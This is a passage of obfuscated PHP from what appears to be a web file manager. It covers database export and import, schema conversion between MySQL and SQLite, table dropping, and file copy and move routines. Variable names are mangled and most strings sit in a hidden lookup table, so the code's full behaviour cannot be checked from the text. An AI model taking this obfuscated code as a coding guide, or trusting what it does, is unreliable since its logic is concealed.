json_decode($—ä±–á[$_SERVER[—ÌÒğš÷][418]], !0); if ($Æ»„‚¸[$_SERVER[—ÌÒğš÷][32]] == $GLOBALS[$_SERVER[—ÌÒğš÷][823]] && $Æ»„‚¸[$_SERVER[—ÌÒğš÷][786]] != 1) { continue; } } } else { if ($—ä±–á[$_SERVER[—ÌÒğš÷][33]] == $_SERVER[—ÌÒğš÷][1115] && $—ä±–á[$_SERVER[—ÌÒğš÷][94]] == $_SERVER[—ÌÒğš÷][815]) { continue; } } } if ($‡Ö¾ëƒ) { $—ä±–á[$_SERVER[—ÌÒğš÷][84]] = "\173\x69\x6f\x3a{$‡Ö¾ëƒ}\x7d" . substr($—ä±–á[$_SERVER[—ÌÒğš÷][84]], strlen("\173\151\x6f\x3a{$—ä±–á[$_SERVER[—ÌÒğš÷][853]]}\x7d")); $—ä±–á[$_SERVER[—ÌÒğš÷][853]] = $‡Ö¾ëƒ; } $È³Üà¼¥[] = $_SERVER[—ÌÒğš÷][1116] . $this->sqlEncode($—ä±–á) . $_SERVER[—ÌÒğš÷][1117]; } $ –Œ…Ú = "\x49\116\x53\105\x52\x54\40\x49\x4e\124\117\x20\x60{$ÆÊ’»}\140\x20\50\140" . implode($_SERVER[—ÌÒğš÷][1118], $şü‚îš¼) . $_SERVER[—ÌÒğš÷][1119]; fwrite($Ú‘µÖ‚¼, $ –Œ…Ú . implode($_SERVER[—ÌÒğš÷][1120], $È³Üà¼¥) . $_SERVER[—ÌÒğš÷][71] . PHP_EOL); $éŠ¦üî¤ += $Ö³°Ûê•; if ($”ß½æèÏ) { $”ß½æèÏ->update($Ö³°Ûê•); } } while ($ïèó×­Õ == $Ö³°Ûê•); fclose($Ú‘µÖ‚¼); return $éŠ¦üî¤; } public function sqlToDb($²«×Ğ‰Ö, &$Íµ™æà€) { $²¸Ó˜şç =& $_SERVER[—ÌÒğš÷]; $“Ì¸• = $this->model()->db(); $¯¡ÈÆÀ‰ = @fopen($²«×Ğ‰Ö, $²¸Ó˜şç[1121]); if (!$¯¡ÈÆÀ‰) { return !1; } $úşçÊöÃ = 0; $³ãêà¾» = $²¸Ó˜şç[12]; $Á†¸„ó = array(); $¡ƒ””šÆ = $this->dbType(); $Çü§ñ‹ = $¡ƒ””šÆ == $²¸Ó˜şç[13] ? 500 : 2000; $‘ª±â = basename($²«×Ğ‰Ö, $²¸Ó˜şç[824]); $ĞÖğƒòÑ = 0; $ğú’Š’ = 4194304 - 104858; $áˆäĞÜå = 1000000 - 104858; while (!feof($¯¡ÈÆÀ‰)) { $­ìñµÆŞ = trim(fgets($¯¡ÈÆÀ‰)); if (!$­ìñµÆŞ) { continue; } $ÉÇÈÀ“ = $this->sqlDecode($­ìñµÆŞ, $¡ƒ””šÆ, $‘ª±â); if (stripos($ÉÇÈÀ“, $²¸Ó˜şç[399]) === 0) { if (!$³ãêà¾») { $³ãêà¾» = $ÉÇÈÀ“ . $²¸Ó˜şç[53]; } continue; } if ($Íµ™æà€) { $Íµ™æà€->task[$²¸Ó˜şç[822]] += 1; } $úşçÊöÃ++; $Á†¸„ó[] = rtrim(rtrim(trim($ÉÇÈÀ“), $²¸Ó˜şç[50]), $²¸Ó˜şç[71]); $òùûÍ§ = null; $‘Ïóßû’ = strlen($ÉÇÈÀ“); $ĞÖğƒòÑ += $‘Ïóßû’; if ($ĞÖğƒòÑ >= ($Çü§ñ‹ == 500 ? $áˆäĞÜå : $ğú’Š’)) { $òùûÍ§ = array_pop($Á†¸„ó); if ($úşçÊöÃ > 1) { $úşçÊöÃ--; } } if ($úşçÊöÃ >= $Çü§ñ‹ || $òùûÍ§) { $ÉÇÈÀ“ = $³ãêà¾» . implode($²¸Ó˜şç[50], $Á†¸„ó); if (!$“Ì¸•->execute($ÉÇÈÀ“)) { return !1; } if ($Íµ™æà€) { $Íµ™æà€->update($úşçÊöÃ); } $Á†¸„ó = array(); $úşçÊöÃ = 0; $ĞÖğƒòÑ = 0; if ($òùûÍ§) { $Á†¸„ó = array($òùûÍ§); $úşçÊöÃ = 1; $ĞÖğƒòÑ = $‘Ïóßû’; } } } fclose($¯¡ÈÆÀ‰); if (!empty($Á†¸„ó)) { $ÉÇÈÀ“ = $³ãêà¾» . implode($²¸Ó˜şç[50], $Á†¸„ó); if (!$“Ì¸•->execute($ÉÇÈÀ“)) { return !1; } if ($Íµ™æà€) { $Íµ™æà€->update($úşçÊöÃ); } } return !0; } public function dropTable($“¤ğµë“ = null) { $áÑ¨˜€ = $this->model()->db(); $Œá€óå = $“¤ğµë“ ? array($“¤ğµë“) : $áÑ¨˜€->getTables(); if (!$Œá€óå) { return; } foreach ($Œá€óå as $“¤ğµë“) { if ($“¤ğµë“) { $“¤ğµë“ = strtolower($“¤ğµë“); } else { continue; } $áÑ¨˜€->execute("\x64\162\x6f\x70\x20\164\x61\142\154\x65\x20\x69\x66\40\x65\x78\x69\x73\164\163\40\140{$“¤ğµë“}\140"); } } private function sqlEncode($áç¿½«) { $•¯µ°Î =& $_SERVER[—ÌÒğš÷]; $©ÎôºØü = array(); foreach ($áç¿½« as $ô¹á£¤¿) { if (is_array($ô¹á£¤¿)) { $ô¹á£¤¿ = json_encode_force($ô¹á£¤¿); } $ô¹á£¤¿ = addslashes($ô¹á£¤¿); $ô¹á£¤¿ = str_replace(array($•¯µ°Î[1122], $•¯µ°Î[246]), array($•¯µ°Î[1123], $•¯µ°Î[1124]), $ô¹á£¤¿); $©ÎôºØü[] = str_replace($•¯µ°Î[58], $•¯µ°Î[1125], $ô¹á£¤¿); } return $•¯µ°Î[58] . implode($•¯µ°Î[1126], $©ÎôºØü) . $•¯µ°Î[58]; } private function sqlDecode($ÆÃ‡•êŞ, $Æ°Ü, $ÎèİçÍĞ = '') { $Ä³Æï®İ =& $_SERVER[—ÌÒğš÷]; $ÆÃ‡•êŞ = str_replace(array($Ä³Æï®İ[1123], $Ä³Æï®İ[1124]), array($Ä³Æï®İ[1122], $Ä³Æï®İ[246]), $ÆÃ‡•êŞ); if ($Æ°Ü == $Ä³Æï®İ[13]) { return $ÎèİçÍĞ != $Ä³Æï®İ[1127] ? stripslashes($ÆÃ‡•êŞ) : $ÆÃ‡•êŞ; } if ($ÎèİçÍĞ == $Ä³Æï®İ[1127]) { $ÆÃ‡•êŞ = str_replace($Ä³Æï®İ[1128], $Ä³Æï®İ[118], stripslashes($ÆÃ‡•êŞ)); } return $ÆÃ‡•êŞ; } public function getSqlFile($õ¨ÒÁÓÚ = '') { $Çå®Ü·ø =& $_SERVER[—ÌÒğš÷]; $“ãû¡şŒ = $this->dbType(!0); $©Ş‡Ì‡¡ = CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\x6c\x2f\x64\141\164\141\x2f{$“ãû¡şŒ}\x2e\163\161\x6c"; $û¾‚°£ë = file_get_contents($©Ş‡Ì‡¡); $„Ÿá¼—ì = $Çå®Ü·ø[1129] . ($“ãû¡şŒ == $Çå®Ü·ø[840] ? $Çå®Ü·ø[1130] : $Çå®Ü·ø[1131]) . $Çå®Ü·ø[1132]; preg_match_all($„Ÿá¼—ì, $û¾‚°£ë, $”…ÊİíÊ); $ò¿åÉ•ª = $”…ÊİíÊ[1]; $ãè‚÷Î = $this->model()->db(); $†”ÜìÄ  = $ãè‚÷Î->getTables(); $ìøÀÓ¡Ú = TEMP_FILES . $Çå®Ü·ø[1133] . date($Çå®Ü·ø[255]) . $Çå®Ü·ø[8]; del_dir($ìøÀÓ¡Ú); mk_dir($ìøÀÓ¡Ú); $Èòğ‡Ó› = $ìøÀÓ¡Ú . $Çå®Ü·ø[1134]; $™“ğÒ³— = $ìøÀÓ¡Ú . $Çå®Ü·ø[1135]; $ş¨£Ş—€ = $“ãû¡şŒ == $Çå®Ü·ø[13] ? $Çå®Ü·ø[840] : $Çå®Ü·ø[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\164\x61\x6c\154\57\x64\x61\164\x61\x2f{$ş¨£Ş—€}\x2e\163\x71\154", $ìøÀÓ¡Ú); @touch($ìøÀÓ¡Ú . $“ãû¡şŒ . $Çå®Ü·ø[824]); $ı¬ƒ† = fopen($Èòğ‡Ó›, $Çå®Ü·ø[1110]); $ú ˜ûÑ = fopen($™“ğÒ³—, $Çå®Ü·ø[1110]); if ($“ãû¡şŒ == $Çå®Ü·ø[13]) { $†”ÜìÄ  = array_diff($†”ÜìÄ , array($Çå®Ü·ø[820], $Çå®Ü·ø[821])); $ü±ã©¿¹ = array($Çå®Ü·ø[1136], $Çå®Ü·ø[1137], $Çå®Ü·ø[1138]); fwrite($ú ˜ûÑ, implode(PHP_EOL, $ü±ã©¿¹) . PHP_EOL . PHP_EOL); foreach ($†”ÜìÄ  as $‘¶Œ¾Ö) { $´¤Óü…ñ = $this->sqlFromSqlite($‘¶Œ¾Ö); if (!$´¤Óü…ñ[$Çå®Ü·ø[13]]) { continue; } fwrite($ú ˜ûÑ, $´¤Óü…ñ[$Çå®Ü·ø[13]] . PHP_EOL . PHP_EOL); if (!in_array($‘¶Œ¾Ö, $ò¿åÉ•ª)) { fwrite($ı¬ƒ†, $´¤Óü…ñ[$Çå®Ü·ø[840]] . PHP_EOL . PHP_EOL); } } } else { foreach ($†”ÜìÄ  as $‘¶Œ¾Ö) { $´¤Óü…ñ = $this->sqlFromMysql($‘¶Œ¾Ö); if (!$´¤Óü…ñ[$Çå®Ü·ø[840]]) { continue; } fwrite($ı¬ƒ†, $´¤Óü…ñ[$Çå®Ü·ø[840]] . PHP_EOL . PHP_EOL); if (!in_array($‘¶Œ¾Ö, $ò¿åÉ•ª)) { fwrite($ú ˜ûÑ, $´¤Óü…ñ[$Çå®Ü·ø[13]] . PHP_EOL . PHP_EOL); } } } fclose($ı¬ƒ†); fclose($ú ˜ûÑ); $û¾‚°£ë = array($Çå®Ü·ø[840] => $Èòğ‡Ó›, $Çå®Ü·ø[13] => $™“ğÒ³—); return $õ¨ÒÁÓÚ ? $û¾‚°£ë[$õ¨ÒÁÓÚ] : $û¾‚°£ë; } public function dbType($º•Àı÷à = false) { $œ²±°¤‹ =& $_SERVER[—ÌÒğš÷]; $€ß‘Â•¸ = $º•Àı÷à ? $GLOBALS[$œ²±°¤‹[6]][$œ²±°¤‹[21]] : $this->database; $€ß‘Â•¸ = array_change_key_case($€ß‘Â•¸); $¨àˆÕ‹× = $€ß‘Â•¸[$œ²±°¤‹[1011]]; if ($¨àˆÕ‹× == $œ²±°¤‹[1008]) { $‹•ÍùÚª = explode($œ²±°¤‹[4], $€ß‘Â•¸[$œ²±°¤‹[1017]]); $¨àˆÕ‹× = $‹•ÍùÚª[0]; } $™èÙ¸Á¼ = array($œ²±°¤‹[1139] => $œ²±°¤‹[13], $œ²±°¤‹[956] => $œ²±°¤‹[840]); if (isset($™èÙ¸Á¼[$¨àˆÕ‹×])) { $¨àˆÕ‹× = $™èÙ¸Á¼[$¨àˆÕ‹×]; } return $¨àˆÕ‹×; } public function sqlFromMysql($è‹üë£Ğ, $§ª¡ÓøÏ = '') { $¼×Ø×§º =& $_SERVER[—ÌÒğš÷]; $ŞÀ¢Ş±— = $this->model()->db(); $«éä¥…í = $ŞÀ¢Ş±—->query($¼×Ø×§º[1140] . $è‹üë£Ğ . $¼×Ø×§º[429]); if (!$«éä¥…í || !$«éä¥…í[0]) { return !1; } $¦Æ†Ä¨ó = _get($«éä¥…í[0], $¼×Ø×§º[1141], $¼×Ø×§º[12]); if (!$¦Æ†Ä¨ó) { return !1; } $äÁá”’ = "\x44\122\117\x50\x20\124\x41\x42\x4c\x45\40\x49\106\40\x45\130\111\123\x54\123\40\140{$è‹üë£Ğ}\140\x3b" . PHP_EOL . $¦Æ†Ä¨ó . $¼×Ø×§º[71]; if ($§ª¡ÓøÏ && $§ª¡ÓøÏ == $¼×Ø×§º[840]) { return $äÁá”’; } $ç¼ƒÇ = array_change_key_case($GLOBALS[$¼×Ø×§º[6]][$¼×Ø×§º[21]]); $úèù‹Ì¥ = $ç¼ƒÇ[$¼×Ø×§º[1016]]; $¶×ÙÉ»ç = $¼×Ø×§º[1142] . $úèù‹Ì¥ . $¼×Ø×§º[1143] . $è‹üë£Ğ . $¼×Ø×§º[58]; $®ó†“ıó = $¼×Ø×§º[1144] . $è‹üë£Ğ . $¼×Ø×§º[944]; $ß©ä™ü¼ = $ŞÀ¢Ş±—->query($¶×ÙÉ»ç); if (empty($ß©ä™ü¼)) { $² Õî†Ğ = array($¼×Ø×§º[840] => $¼×Ø×§º[12], $¼×Ø×§º[13] => $¼×Ø×§º[12]); return $§ª¡ÓøÏ ? $² Õî†Ğ[$§ª¡ÓøÏ] : $² Õî†Ğ; } $¨¹Ô†‚» = $ŞÀ¢Ş±—->query($®ó†“ıó); $òöÇ¯»Š = $¼×Ø×§º[12]; $®ò¸ã“– = array(); foreach ($¨¹Ô†‚» as $ÜêëÈ ¨) { if (!$òöÇ¯»Š && $ÜêëÈ ¨[$¼×Ø×§º[1145]] == $¼×Ø×§º[1146]) { $òöÇ¯»Š = $ÜêëÈ ¨[$¼×Ø×§º[1147]]; } if (isset($®ò¸ã“–[$ÜêëÈ ¨[$¼×Ø×§º[1145]]])) { $®ò¸ã“–[$ÜêëÈ ¨[$¼×Ø×§º[1145]]][$¼×Ø×§º[1148]][] = $ÜêëÈ ¨[$¼×Ø×§º[1147]]; continue; } $®ò¸ã“–[$ÜêëÈ ¨[$¼×Ø×§º[1145]]] = array($¼×Ø×§º[1149] => $ÜêëÈ ¨[$¼×Ø×§º[1145]], $¼×Ø×§º[1148] => array($ÜêëÈ ¨[$¼×Ø×§º[1147]]), $¼×Ø×§º[1150] => $ÜêëÈ ¨[$¼×Ø×§º[1151]] == $¼×Ø×§º[88] ? 0 : 1); } $ı”Š¿—­ = array(); foreach ($®ò¸ã“– as $ÜêëÈ ¨) { $¬·á½È­ = $ÜêëÈ ¨[$¼×Ø×§º[1149]] == $¼×Ø×§º[1146]; $¨ßæ¾Êò = array($¼×Ø×§º[1152], $ÜêëÈ ¨[$¼×Ø×§º[1150]] == $¼×Ø×§º[88] && !$¬·á½È­ ? $¼×Ø×§º[1153] : $¼×Ø×§º[12], $¼×Ø×§º[1154], $¼×Ø×§º[1155] . $è‹üë£Ğ . $¼×Ø×§º[11] . ($¬·á½È­ ? $¼×Ø×§º[1156] : $ÜêëÈ ¨[$¼×Ø×§º[1149]]) . $¼×Ø×§º[118], $¼×Ø×§º[1157], $¼×Ø×§º[118] . $è‹üë£Ğ . $¼×Ø×§º[118], $¼×Ø×§º[1158] . implode($¼×Ø×§º[1159], $ÜêëÈ ¨[$¼×Ø×§º[1148]]) . $¼×Ø×§º[1160]); $ı”Š¿—­[] = implode($¼×Ø×§º[53], $¨ßæ¾Êò) . $¼×Ø×§º[71]; } $ş‚Ğá™û = array(); $åÈü²ôí = array($¼×Ø×§º[1161] => $¼×Ø×§º[1162], $¼×Ø×§º[1162] => $¼×Ø×§º[1162], $¼×Ø×§º[332] => $¼×Ø×§º[359], $¼×Ø×§º[331] => $¼×Ø×§º[359]); foreach ($ß©ä™ü¼ as $ÜêëÈ ¨) { $¨ßæ¾Êò = array($¼×Ø×§º[118] . $ÜêëÈ ¨[$¼×Ø×§º[1163]] . $¼×Ø×§º[118], isset($åÈü²ôí[$ÜêëÈ ¨[$¼×Ø×§º[1164]]]) ? $åÈü²ôí[$ÜêëÈ ¨[$¼×Ø×§º[1164]]] : $ÜêëÈ ¨[$¼×Ø×§º[1165]], $ÜêëÈ ¨[$¼×Ø×§º[1166]] == $¼×Ø×§º[942] ? $¼×Ø×§º[1167] : $¼×Ø×§º[1168], $ÜêëÈ ¨[$¼×Ø×§º[1163]] == $òöÇ¯»Š ? $¼×Ø×§º[1169] : $¼×Ø×§º[12], $ÜêëÈ ¨[$¼×Ø×§º[993]] ? strtoupper(str_replace($¼×Ø×§º[11], $¼×Ø×§º[12], $ÜêëÈ ¨[$¼×Ø×§º[993]])) : $¼×Ø×§º[12]); $ş‚Ğá™û[] = trim(implode($¼×Ø×§º[53], $¨ßæ¾Êò)); } $±Şƒ¹¶˜ = array($¼×Ø×§º[1170] . $è‹üë£Ğ . $¼×Ø×§º[1171], $¼×Ø×§º[1172] . $è‹üë£Ğ . $¼×Ø×§º[1173], implode($¼×Ø×§º[50] . PHP_EOL, $ş‚Ğá™û), $¼×Ø×§º[990]); $‘Û»­½Œ = implode(PHP_EOL, array_merge($±Şƒ¹¶˜, $ı”Š¿—­)); if ($§ª¡ÓøÏ && $§ª¡ÓøÏ == $¼×Ø×§º[13]) { return $‘Û»­½Œ; } $² Õî†Ğ = array($¼×Ø×§º[840] => $äÁá”’, $¼×Ø×§º[13] => $‘Û»­½Œ); return $§ª¡ÓøÏ ? $² Õî†Ğ[$§ª¡ÓøÏ] : $² Õî†Ğ; } public function sqlFromSqlite($ÕÍ«¶îÉ, $ó–Ñ€ğ¹ = '') { $úıî¤· =& $_SERVER[—ÌÒğš÷]; $…Ù³‰•˜ = $this->model()->db(); $“óÈÍ›’ = "\120\x52\101\x47\x4d\101\x20\x54\x41\x42\x4c\x45\137\x49\116\106\x4f\x20\x28\x27{$ÕÍ«¶îÉ}\47\x29"; $¤şşæî× = "\x53\x45\x4c\x45\x43\x54\x20\x2a\40\106\x52\117\x4d\x20\163\x71\154\151\x74\x65\137\155\141\x73\x74\145\x72\40\127\110\x45\122\105\40\x74\142\154\x5f\x6e\x61\155\x65\x20\x3d\40\47{$ÕÍ«¶îÉ}\x27"; $Ğí˜ÄÈ = $…Ù³‰•˜->query($“óÈÍ›’); if (empty($Ğí˜ÄÈ)) { $’‚ö·¨³ = array($úıî¤·[840] => $úıî¤·[12], $úıî¤·[13] => $úıî¤·[12]); return $ó–Ñ€ğ¹ ? $’‚ö·¨³[$ó–Ñ€ğ¹] : $’‚ö·¨³; } $ºıÑƒ¡¤ = $…Ù³‰•˜->query($¤şşæî×); $ÒË»Üä‹ = $†Öš®Šş = array(); foreach ($ºıÑƒ¡¤ as $Æ¤ôéò‘) { if ($Æ¤ôéò‘[$úıî¤·[33]] == $úıî¤·[323]) { $ÒË»Üä‹[] = $Æ¤ôéò‘[$úıî¤·[1174]]; } else { $†Öš®Šş[$Æ¤ôéò‘[$úıî¤·[32]]] = $Æ¤ôéò‘[$úıî¤·[1174]]; } } $Óû±ÌÛá = array_merge(array($úıî¤·[1170] . $ÕÍ«¶îÉ . $úıî¤·[118]), $ÒË»Üä‹, array_values($†Öš®Šş)); $Óû±ÌÛá = implode($úıî¤·[71] . PHP_EOL, $Óû±ÌÛá) . $úıî¤·[71]; if ($ó–Ñ€ğ¹ && $ó–Ñ€ğ¹ == $úıî¤·[13]) { return $Óû±ÌÛá; } $éùÄ©ºä = array(); $¶£•‘½Š = array($úıî¤·[1162] => $úıî¤·[1175], $úıî¤·[359] => $úıî¤·[1176]); $ûéå³° = $úıî¤·[12]; foreach ($Ğí˜ÄÈ as $Æ¤ôéò‘) { if ($Æ¤ôéò‘[$úıî¤·[57]] == $úıî¤·[88]) { $ûéå³° = $Æ¤ôéò‘[$úıî¤·[32]]; } $àÍ©ñ¤ = array($úıî¤·[429] . $Æ¤ôéò‘[$úıî¤·[32]] . $úıî¤·[429], isset($¶£•‘½Š[$Æ¤ôéò‘[$úıî¤·[33]]]) ? $¶£•‘½Š[$Æ¤ôéò‘[$úıî¤·[33]]] : $Æ¤ôéò‘[$úıî¤·[33]], $Æ¤ôéò‘[$úıî¤·[35]] == $úıî¤·[88] ? $úıî¤·[1167] : $úıî¤·[1177] . $Æ¤ôéò‘[$úıî¤·[56]], $Æ¤ôéò‘[$úıî¤·[57]] == $úıî¤·[88] ? $úıî¤·[1178] : $úıî¤·[12]); $éùÄ©ºä[] = trim(implode($úıî¤·[53], $àÍ©ñ¤)); } foreach ($†Öš®Šş as $Î²È¶‹¨ => $Å¦åşÀ¢) { $œÈåëĞó = str_replace($úıî¤·[1179] . $ÕÍ«¶îÉ . $úıî¤·[11], $úıî¤·[12], $Î²È¶‹¨); $ÈªĞ©úÏ = str_replace(array($úıî¤·[118], $úıî¤·[1001]), $úıî¤·[429], substr($Å¦åşÀ¢, stripos($Å¦åşÀ¢, $úıî¤·[304]))); if ($œÈåëĞó == $úıî¤·[1156]) { $åÈÚÄí¥ = $úıî¤·[1180] . $ûéå³° . $úıî¤·[1181]; } else { $åÈÚÄí¥ = (stripos($œÈåëĞó, $úıî¤·[11]) ? $úıî¤·[1182] : $úıî¤·[12]) . ($úıî¤·[1183] . $œÈåëĞó . $úıî¤·[1184] . $ÈªĞ©úÏ); } $éùÄ©ºä[] = $åÈÚÄí¥; } $¿•ÏŒô³ = array($úıî¤·[1185] . $ÕÍ«¶îÉ . $úıî¤·[1186], $úıî¤·[1187] . $ÕÍ«¶îÉ . $úıî¤·[1188], implode($úıî¤·[50] . PHP_EOL, $éùÄ©ºä), $úıî¤·[1189]); $ˆ‘ÍŠÜ = implode(PHP_EOL, $¿•ÏŒô³); if ($ó–Ñ€ğ¹ && $ó–Ñ€ğ¹ == $úıî¤·[840]) { return $ˆ‘ÍŠÜ; } $’‚ö·¨³ = array($úıî¤·[840] => $ˆ‘ÍŠÜ, $úıî¤·[13] => $Óû±ÌÛá); return $ó–Ñ€ğ¹ ? $’‚ö·¨³[$ó–Ñ€ğ¹] : $’‚ö·¨³; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($øİøİ“à, $úÊè) { $Ù×µ×¢Ğ =& $_SERVER[—ÌÒğš÷]; $›Ï©Ë„ = $úÊè; $GLOBALS[$Ù×µ×¢Ğ[1190]] = $Ù×µ×¢Ğ[1191] . $øİøİ“à; Hook::trigger($Ù×µ×¢Ğ[1191] . $øİøİ“à . $Ù×µ×¢Ğ[1192], $›Ï©Ë„); $™–È–† = self::driverMake($úÊè[0]); if (!$™–È–†) { return !1; } if (method_exists($™–È–†, $øİøİ“à)) { $ç¾³Úƒí = @call_user_func_array(array($™–È–†, $øİøİ“à), $úÊè); } else { if (method_exists($™–È–†, $Ù×µ×¢Ğ[1193])) { $ç¾³Úƒí = @call_user_func_array(array($™–È–†, $øİøİ“à), $úÊè); } else { if (method_exists(self, $øİøİ“à)) { $ç¾³Úƒí = @call_user_func_array(array(self, $øİøİ“à), $úÊè); } else { $ç¾³Úƒí = call_user_func_array(array(parent, $øİøİ“à), $úÊè); } } } Hook::trigger($Ù×µ×¢Ğ[1191] . $øİøİ“à . $Ù×µ×¢Ğ[1194], $›Ï©Ë„, $ç¾³Úƒí); return $ç¾³Úƒí; } public static function init($ÃÕƒûò) { return self::driverMake($ÃÕƒûò); } public static function copy($¥ÁŒúßÒ, $·ñ£ÌÎá, $ü ë¡ö = false, $×İ‹˜à = false) { return self::copyMoveStart($¥ÁŒúßÒ, $·ñ£ÌÎá, $ü ë¡ö, $_SERVER[—ÌÒğš÷][586], $×İ‹˜à); } public static function move($³¹¬ŠÎª, $ÎÈ”—ç», $É¢Á…îé = false, $ØÌåŒŸû = false) { return self::copyMoveStart($³¹¬ŠÎª, $ÎÈ”—ç», $É¢Á…îé, $_SERVER[—ÌÒğš÷][588], $ØÌåŒŸû); } private static function copyMoveStart($²èå³Ï·, $ã€»Ÿö‡, $–›ì®¿, $ƒÛæ¦Ì, $ğÖñİä­) { $¼×ˆ™¬à =& $_SERVER[—ÌÒğš÷]; $”˜ ’¦¶ = array($²èå³Ï·, $ã€»Ÿö‡, $–›ì®¿, $ğÖñİä­); Hook::trigger($¼×ˆ™¬à[1191] . $ƒÛæ¦Ì . $¼×ˆ™¬à[1192], $”˜ ’¦¶); $«ƒª¯Ş× = self::copyMove($²èå³Ï·, $ã€»Ÿö‡, $–›ì®¿, $ƒÛæ¦Ì, $ğÖñİä­); Hook::trigger($¼×ˆ™¬à[1191] . $ƒÛæ¦Ì . $¼×ˆ™¬à[1194], $”˜ ’¦¶, $«ƒª¯Ş×); return $«ƒª¯Ş×; } public static function saveFile($éÁ‚¹ï½, $ÚÔïâÀ³, $šÙĞÂğ = true) { $Êø§“¦á =& $_SERVER[—ÌÒğš÷]; $×…éİ„Î = self::info($ÚÔïâÀ³); $ŒØ³ÂÒŸ = self::driverMake($éÁ‚¹ï½); $»ò¬¾£œ = self::driverMake($ÚÔïâÀ³); $èØíˆ½ = !1; if ($»ò¬¾£œ->pathParse[$Êø§“¦á[1195]]) { $èØíˆ½ = $»ò¬¾£œ; $Ùø§– = $»ò¬¾£œ->pathParse[$Êø§“¦á[1195]]; $»ò¬¾£œ = self::driverMake($Ùø§–); } if ($ŒØ³ÂÒŸ->pathParse[$Êø§“¦á[1195]]) { $Û÷«Ûñê = $ŒØ³ÂÒŸ->pathParse[$Êø§“¦á[1195]]; $ŒØ³ÂÒŸ = self::driverMake($Û÷«Ûñê); } $‘›İƒ¶Œ = $»ò¬¾£œ->pathFather($ÚÔïâÀ³); $öáê”Ù› = !0; if (!$šÙĞÂğ && self::driverIsSame($ŒØ³ÂÒŸ, $»ò¬¾£œ)) { $öáê”Ù› = !1; } $ª¼üÌ†Ò = self::copyFile($ŒØ³ÂÒŸ, $éÁ‚¹ï½, $»ò¬¾£œ, $‘›İƒ¶Œ, $×…éİ„Î[$Êø§“¦á[32]], $öáê”Ù›); if ($èØíˆ½) { $ª¼üÌ†Ò = $èØíˆ½->getPathOuter($ª¼üÌ†Ò); } return $ª¼üÌ†Ò; } private static function copyMove($¡ŸÔşğ­, $Šó¢–çÚ, $²‹ı½ª, $ŸÀÄê©Ì, $é²ƒ®–ù = false) { $ ¿ú·Ğä =& $_SERVER[—ÌÒğš÷]; if (!$¡ŸÔşğ­ || $¡ŸÔşğ­ == $ ¿ú·Ğä[8] || !$Šó¢–çÚ) { return !1; } ignore_timeout(); $¾Ó¥¿çİ = self::driverMake($¡ŸÔşğ­); $è€óÎÊ÷ = self::driverMake($Šó¢–çÚ); $ı›•‹æ´ = $ŸÀÄê©Ì == $ ¿ú·Ğä[588]; $½Õ¶Ú»Ú = !1; if ($è€óÎÊ÷->pathParse[$ ¿ú·Ğä[1195]]) { $½Õ¶Ú»Ú = $è€óÎÊ÷; $Šó¢–çÚ = $è€óÎÊ÷->pathParse[$ ¿ú·Ğä[1195]]; $è€óÎÊ÷ = self::driverMake($Šó¢–çÚ); } if ($¾Ó¥¿çİ->pathParse[$ ¿ú·Ğä[1195]]) { $¡ŸÔşğ­ = $¾Ó¥¿çİ->pathParse[$ ¿ú·Ğä[1195]]; $¾Ó¥¿çİ = self::driverMake($¡ŸÔşğ­); } self::check($¾Ó¥¿çİ, $¡ŸÔşğ­, $è€óÎÊ÷, $Šó¢–çÚ); Hook::trigger($ ¿ú·Ğä[1196], $¾Ó¥¿çİ, $¡ŸÔşğ­, $è€óÎÊ÷, $Šó¢–çÚ); $µ½éçøÏ = self::driverIsSame($¾Ó¥¿çİ, $è€óÎÊ÷); if ($µ½éçøÏ) { if ($ŸÀÄê©Ì == $ ¿ú·Ğä[588] && !method_exists($è€óÎÊ÷, $ ¿ú·Ğä[1197]) && trim($Šó¢–çÚ, $ ¿ú·Ğä[8]) == trim($è€óÎÊ÷->pathFather($¡ŸÔşğ­), $ ¿ú·Ğä[8])) { if ($¾Ó¥¿çİ->pathThis($¡ŸÔşğ­) != $é²ƒ®–ù && !$¾Ó¥¿çİ->isTypeObject()) { return $¾Ó¥¿çİ->rename($¡ŸÔşğ­, $é²ƒ®–ù); } return $è€óÎÊ÷->getPathOuter($¡ŸÔşğ­); } if (method_exists($è€óÎÊ÷, $ŸÀÄê©Ì)) { return $è€óÎÊ÷->{$ŸÀÄê©Ì}($¡ŸÔşğ­, $Šó¢–çÚ, $²‹ı½ª, $é²ƒ®–ù); } } if ($µ½éçøÏ && $ŸÀÄê©Ì == $ ¿ú·Ğä[588] && $è€óÎÊ÷->getType() == $ ¿ú·Ğä[106]) { $©ÊüéÜè = $è€óÎÊ÷->movePath($¡ŸÔşğ­, $Šó¢–çÚ, $é²ƒ®–ù); if ($©ÊüéÜè) { return $©ÊüéÜè; } } $Ã¶ûëÀ‰ = $¾Ó¥¿çİ->isFile($¡ŸÔşğ­); if (!$Ã¶ûëÀ‰ && $è€óÎÊ÷->getType() == $ ¿ú·Ğä[793] && $¾Ó¥¿çİ->getType() == $ ¿ú·Ğä[106]) { $©ÊüéÜè = $è€óÎÊ÷->copyFolderFromIO($¾Ó¥¿çİ, $¡ŸÔşğ­, $Šó¢–çÚ, $²‹ı½ª, $ı›•‹æ´, $é²ƒ®–ù); } else { $©ÊüéÜè = self::copyPath($¾Ó¥¿çİ, $¡ŸÔşğ­, $è€óÎÊ÷, $Šó¢–çÚ, $²‹ı½ª, $ı›•‹æ´, $Ã¶ûëÀ‰, $é²ƒ®–ù); } if ($©ÊüéÜè && $ı›•‹æ´) { $¾Ó¥¿çİ->remove($¡ŸÔşğ­); } if ($½Õ¶Ú»Ú) { $©ÊüéÜè = $½Õ¶Ú»Ú->getPathOuter($©ÊüéÜè); } return $©ÊüéÜè; } private static function check($´ºÆ»¿, $ĞŠÆÉÑà, $Ñ•°¡à™, &$­ªºÌ) { $­‚¼ Ê =& $_SERVER[—ÌÒğš÷]; if (self::driverIsSame($´ºÆ»¿, $Ñ•°¡à™) && $´ºÆ»¿->isFolder($ĞŠÆÉÑà) && $´ºÆ»¿->isParentOf($ĞŠÆÉÑà, $­ªºÌ)) { show_json(LNG($­‚¼ Ê[1198]), !1); } if (!$´ºÆ»¿->exist($ĞŠÆÉÑà)) { show_json(LNG($­‚¼ Ê[105]), !1); } } private static function copyPath($™ÀµïÔ¾, $‡Ë– õ, $¦Ôš©ŞÔ, $Æê‡Âí±, $ÒÊéßƒÑ, $ƒ¬ŒÛõš, $»çÃœ¯Ğ, $ã˜ç‰‰‰ = false, 